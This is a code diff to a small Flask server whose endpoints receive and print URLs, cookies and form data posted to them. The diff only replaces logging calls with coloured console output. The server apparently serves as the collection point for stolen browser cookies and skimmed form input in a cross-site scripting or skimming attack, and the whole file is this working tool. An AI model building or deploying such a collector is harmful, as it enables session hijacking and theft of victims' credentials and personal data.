@@ -1,9 +1,11 @@
 from flask import Flask, request
 import json
 import logging
+from rich import print as rprint
 
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
+
 
 logging.basicConfig(level=logging.INFO)
 
@@ -17,19 +19,19 @@ def hello_world():
 def get_url():
     if request.json:
         url = request.json["url"]
-        logging.info(f"URL: {url}")
+        rprint(f"[blue][+] URL: {url}[/blue]")
     return "Thanks!"
 
 @app.route("/c", methods=["POST"])
 def get_cookie():
     if request.json:
         cookie = request.json["cookie"]
-        logging.info(f"Cookie: {cookie}")
+        rprint(f"[yellow][+] Cookie: {cookie}[/yellow]")
     return "Thanks!"
 
 @app.route("/f", methods=["POST"])
 def get_form_data():
     if request.json:
         data = request.json["data"]
-        logging.info(f"Form Data: {data}")
+        rprint(f"[red][+] Form Data: {data}[/red]")
     return "Thanks!"
